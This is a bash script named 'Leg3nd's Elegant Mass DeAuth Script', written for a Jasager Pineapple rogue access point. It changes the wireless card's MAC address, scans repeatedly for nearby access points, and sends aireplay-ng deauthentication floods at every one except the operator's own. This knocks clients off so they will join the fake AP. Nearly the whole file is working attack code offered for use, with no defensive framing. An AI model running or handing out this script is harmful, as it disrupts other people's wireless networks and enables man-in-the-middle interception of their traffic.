#!/bin/bash
#
#Leg3nd's Elegant Mass DeAuth Script
#Required for mass deauth in leg3nd-Jasager
#v1.3 Designed for use with Jasager Pineapple Router

#
#GENERAL - If you INCREASE waitTime, You should Increase DEAUTHS.
#	 - If you DECREASE waitTime, You should decrease DEAUTHS.
#	 - Have to find the correct balence for your situation, how much your moving, how many APs and clients.
#
#This script is VERY touchy and extremely logical, dont touch any variables or statements.


#User Variables
waitTime="90000" #Time to wait before refresh scan data.
MIFACE="mon0"  #attack mode, monitor interface
WIFACE="wlan0"  #wifi cards interface
FONINT="eth0"  # Our fakeAP interface
DEAUTHS="100" #Number of DeAuths to Send, 0 = Infinate
ourAPmac="00:12:CF:A4:92:B1"  #Pineapples MAC
nokick="00:12:CF:A4:92:B1"
#ourAPmac=`macchanger -s $APMACINT | awk '{ print $3 }' | tr '[a-z]' '[A-Z]'`

################################################# CODE - DONT TOUCH
version="1.3"
atk="0"
echo -e "\e[01;32m[>]\e[00m Setting up for attack..."

trap 'cleanup' 2 # Interrupt - "Ctrl + C"
function cleanup() {
	break
	xterm -geometry 75x12+464+288 -bg black -fg green -T "Mass DeAuth v$version - Killing DeAuths.." -e "killall -9 aireplay-ng"
	exit 0
}

if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi

moncheck=`ifconfig | grep $MIFACE | awk '{print $1}' | cut -b 4`
#mon0check=`ifconfig | grep mon0 | awk '{print $1}' | cut -b 4`

#if [ $mon0check -ne 0 ]; then 
#	xterm -geometry 75x12+464+288 -bg black -fg green -T "leg3ndAP v$version - Start $MIFACE" -e "airmon-ng start $WIFACE" &
#fi
xterm -geometry 75x12+464+288 -bg black -fg green -T "leg3ndAP v$version - Start $WIFACE" -e "ifconfig $WIFACE up" &

while [ ! $moncheck ];
do
	moncheck=`ifconfig | grep $MIFACE | awk '{print $1}' | cut -b 4`
	xterm -geometry 75x10+464+446 -bg black -fg green -T "leg3ndAP v$version - Start $MIFACE" -e "airmon-ng start $WIFACE"
	moncheck=`ifconfig | grep $MIFACE | awk '{print $1}' | cut -b 4`
done

echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
xterm -geometry 75x8+100+0 -T "MassDeAuth v$version - Changing MAC Address of $MIFACE" -e "ifconfig $MIFACE down && macchanger -A $MIFACE && ifconfig $MIFACE up" &
sleep 2
scan1="0"

while true
do
	curLine="1"
	x="1"
	
	#SLEEPING SO WE DONT OWN TOO HARD
	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
	if [ $atk -eq 1 ]; then  killall -9 aireplay-ng ; fi 

	#REMOVE OLD SCAN DATA
	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
	
	#CREATE NEW UPDATED SCAN DATA
	iwlist $WIFACE scan > /tmp/scan.tmp
	sleep 2
	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | grep -v $nokick | cut -b 30-60 > /tmp/APmacs.lst
	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
	
	#RESET VARIABLES
	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`

	echo -e "\e[01;32m[>]\e[00m DeAuth'ing $lineNum APs from scan data..."
	#T3H 1337 ALGORITHM
       for (( b=1; b<=$lineNum; b++ ))
	do
	scan1="1"
	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
	echo -e "\e[01;32m[>]\e[00m DeAuth'ing All Clients on $curAP ..."
	xterm -geometry 75x9+464+446 -bg black -fg green -T "Mass DeAuth v$version" -e "aireplay-ng -0 $DEAUTHS --ignore-negative-one -D -a $curAP $MIFACE" &
	curLine=$(($curLine+$x))
	done
	atk="1"
done
